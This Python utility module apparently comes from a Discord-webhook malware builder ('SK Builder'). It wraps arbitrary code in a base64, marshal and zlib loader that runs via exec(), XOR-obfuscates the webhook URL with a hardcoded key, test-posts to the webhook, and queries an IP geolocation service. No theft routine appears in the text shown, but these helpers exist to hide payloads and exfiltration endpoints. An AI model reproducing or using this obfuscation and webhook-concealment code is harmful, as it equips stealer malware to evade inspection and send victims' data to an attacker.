from contextlib import suppress
import requests, base64, zlib, marshal

LOADER_TEMPLATE = '''
import base64, marshal{decompress_import}
a={b64!s}
b=base64.b64decode(a)
{maybe_decompress}
c=marshal.loads(b)
exec(c)
'''

class Bcolors:
    HEADER    = '\033[95m'
    OKBLUE    = '\033[94m'
    OKCYAN    = '\033[96m'
    OKGREEN   = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    RESET     = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'

class Tools:
    @staticmethod
    def obfuscate_code(code_str: str, compress: bool = False):
        code_obj = compile(code_str, "<string>", "exec")
        data = marshal.dumps(code_obj)

        if compress:
            data = zlib.compress(data)

        b64 = base64.b64encode(data).decode("ascii")

        loader = LOADER_TEMPLATE.format(
            b64=repr(b64),
            decompress_import=", zlib" if compress else "",
            maybe_decompress="b=zlib.decompress(b)" if compress else ""
        )
        return loader

    @staticmethod
    def protect_webhook(webhook: str, chave: str = "CirqueiraAmaOEstadoDeSaoPaulo") -> str:
        xor_bytes = bytes([ord(c) ^ ord(chave[i % len(chave)]) for i, c in enumerate(webhook)])
        return base64.urlsafe_b64encode(xor_bytes).decode()

    @staticmethod
    def check_requirements(requirements):
        missing = []
        installed = []
        for req in requirements:
            try:
                __import__(req.split(".")[0])
                installed.append(req)
            except ImportError:
                missing.append(req)
        return {"installed": installed, "missing": missing}

    @staticmethod
    def send_webhook(url: str):
        try:
            data = {
                "embeds": [
                    {
                        "title": "SK Builder",
                        "description": "\n**• Your webhook is working.**\n",
                        "color": 0xE53935,
                        "footer": {
                            "text": "https://github.com/CirqueiraDev | @CirqueiraDev"
                        }
                    }
                ]
            }

            r = requests.post(url, json=data, timeout=5)

            if r.status_code in (200, 204):
                return True, "Valid Discord webhook!"

            try:
                err_json = r.json()
                msg = err_json.get("message", "Unknown error")
            except:
                msg = f"HTTP {r.status_code}"

            return False, msg
        
        except requests.exceptions.RequestException as e:
            return False, str(e)

    @staticmethod
    def ipwhois(ip: str):
        with suppress(Exception), requests.get(f"https://ipwhois.app/json/{ip}/") as s:
            return s.json()
        return {"success": False}